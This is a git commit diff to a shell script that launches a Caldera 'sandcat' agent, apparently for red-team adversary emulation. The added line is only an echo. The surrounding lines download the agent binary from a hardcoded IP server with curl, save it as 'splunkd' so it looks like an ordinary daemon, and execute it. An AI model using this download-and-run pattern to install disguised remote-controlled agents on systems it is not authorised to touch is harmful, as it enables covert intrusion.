226047947b76d6e45e8811a4ab2a2dd9c56aad80
Rahul Jadhav <nyrahul@gmail.com>
2024-04-15 23:03:31 +0530

    updated caldera-agent
    Signed-off-by: Rahul Jadhav <nyrahul@gmail.com>

--- caldera-sandcat/scripts/run-agent.sh
+++ caldera-sandcat/scripts/run-agent.sh
@@ -5,6 +5,7 @@ server="http://35.188.10.229:8888"
 [[ "$CALDERA_TEAM" != "" ]] && team="$CALDERA_TEAM"
 [[ "$CALDERA_SRV" != "" ]] && server="$CALDERA_SRV"
 
+echo "Starting Caldera Agent => Team:$team, Server=$server"
 curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd
 chmod +x splunkd
 ./splunkd -server $server -group $team -v
